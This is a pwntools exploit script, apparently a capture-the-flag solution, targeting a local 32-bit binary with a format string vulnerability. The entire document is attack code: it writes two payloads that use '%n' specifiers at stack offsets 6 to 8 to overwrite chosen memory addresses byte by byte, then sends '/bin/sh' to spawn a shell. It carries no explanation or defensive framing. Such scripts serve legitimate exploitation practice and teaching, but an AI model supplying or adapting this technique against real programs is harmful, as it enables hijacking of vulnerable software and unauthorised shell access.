from pwn import *

import time

target = process("./chall-test_fmtString-6-x86")
gdb.attach(target, gdbscript="verify_exploit")

value = 0x8049215
address = 0x804b310

address0 = p32(address)
address1 = p32(address + 1)
address2 = p32(address + 2)

print0 = "%9x"
print1 = "%125x"
print2 = "%1906x"

fmt0 = "%6$n"
fmt1 = "%7$n"
fmt2 = "%8$n"

payload = ""
payload += address0
payload += address1
payload += address2

payload += print0
payload += fmt0

payload += print1
payload += fmt1

payload += print2
payload += fmt2

target.sendline(payload)
value = 0x80490a0
address = 0x804b2f0

address0 = p32(address)
address1 = p32(address + 1)
address2 = p32(address + 2)

print0 = "%148x"
print1 = "%240x"
print2 = "%1652x"

fmt0 = "%6$n"
fmt1 = "%7$n"
fmt2 = "%8$n"

payload = ""
payload += address0
payload += address1
payload += address2

payload += print0
payload += fmt0

payload += print1
payload += fmt1

payload += print2
payload += fmt2

target.sendline(payload)

target.sendline("/bin/sh\x00")


target.recvall(timeout = 5)


time.sleep(2)
